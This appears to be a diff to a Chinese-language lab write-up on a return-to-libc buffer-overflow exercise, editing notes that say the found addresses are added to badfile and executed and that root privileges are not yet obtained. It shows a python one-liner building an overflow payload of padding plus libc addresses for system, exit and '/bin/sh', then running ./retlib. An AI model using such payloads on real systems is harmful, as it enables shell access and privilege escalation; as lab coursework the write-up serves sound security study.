@@ -161,7 +161,8 @@ Return to Libc
     find /bin/sh
 ![image](https://github.com/user-attachments/assets/d9d1b723-5667-4a89-bfd0-34074a0e55f6)
 
-    將找到的機器語言加入到badfile
+    將找到的機器語言加入到badfile並執行
+    權限目前還未提升到root
     python -c 'print "A"*24 + "\xb0\xfd\xe3\xb7" + "\xe0\x39\xe3\xb7" +"\x2b\x0b\xf6\xb7"' > badfile
     ./retlib
 ![image](https://github.com/user-attachments/assets/7078dd06-c7f2-4d3f-8cd8-ce23cff82a0b)
